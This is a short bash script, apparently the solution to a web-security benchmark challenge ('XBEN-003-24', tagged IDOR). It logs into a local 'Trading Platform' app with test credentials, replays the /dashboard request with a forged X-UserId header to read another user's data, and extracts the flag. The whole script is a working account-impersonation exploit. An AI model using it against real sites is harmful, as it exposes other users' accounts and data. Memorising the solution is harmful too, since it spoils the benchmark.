#!/usr/bin/env bash
# XBEN-003-24 — "Trading Platform" (tags: idor)
#
# `/dashboard` reads the session for the current user, and then lets an
# `X-UserId` request header override it. The header is validated (the id has to
# exist) but never authorized, so it is an identity anyone can assert.
#
# A header is not something a page's forms will send, which is the point of a
# workbench: replay the session's own request with one header added.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben003-$$"
VICTIM="${2:-10052}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' \
    --session "$SESSION" >/dev/null

# `replay` reports the sequence its own request and response were stored under,
# so the answer is read back by name rather than by "whatever came last".
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=GET' --set 'path=/dashboard' --set "header.X-UserId=$VICTIM" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
